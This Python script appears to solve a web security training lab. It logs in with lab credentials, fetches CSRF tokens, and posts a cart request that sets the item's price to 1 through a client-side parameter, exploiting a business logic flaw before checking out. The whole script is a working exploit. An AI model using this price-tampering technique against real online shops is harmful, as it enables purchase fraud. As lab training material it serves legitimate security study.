#comments
#Application mapping
#1. login as the user
#2. Add an item to the cart
#3. Purchase the item
#4. Confirm that we solved the lab
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# this method fetches the csrf token from url and returns csrf token
def get_csrf_token(session, url):
    r = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

# Retrieve csrf token from get_csrf_token method for every post request
def buy_item(session, main_url):
    # Retrieve the CSRF token
    login_url = main_url + "/login"
    csrf_token = get_csrf_token(session, login_url)

    # Login as the wiener user
    print("(+) Logging in as the wiener user...")
    data_login = {"csrf": csrf_token, "username": "wiener", "password": "peter"}
    r = session.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print("(+) Successfully logged in as the wiener user.")

        # Add item to cart
        cart_url = main_url + "/cart"
        data_cart = {"productId": "1", "redir": "PRODUCT", "quantity": "1", "price": "1"}
        r = session.post(cart_url, data=data_cart, verify=False, proxies=proxies)

        # Checkout
        checkout_url = main_url + "/cart/checkout"
        checkout_csrf_token = get_csrf_token(session, cart_url)
        data_checkout = {"csrf": checkout_csrf_token}
        r = session.post(checkout_url, data=data_checkout, verify=False, proxies=proxies)

        # Check if we solved the lab
        if "Congratulations" in r.text:
            print("(+) Successfully exploited the business logic vulnerability.")
        else:
            print("(-) Could not exploit the business logic vulnerability.")
            sys.exit(-1)
    else:
        print("(-) Could not login as user.")


def main():    
    if len(sys.argv)!=2:
        print("Warning!\nNot enough arguments!.Please provide by following below usage command and Example")
        print("(+) Usage command: %s <url>" %sys.argv[0])
        print("(+) Example:%s www.example.com" %sys.argv[0])
        sys.exit(-1)
    session=requests.Session()
    main_url=sys.argv[1]
    buy_item(session, main_url)

if __name__ == "__main__":
    main()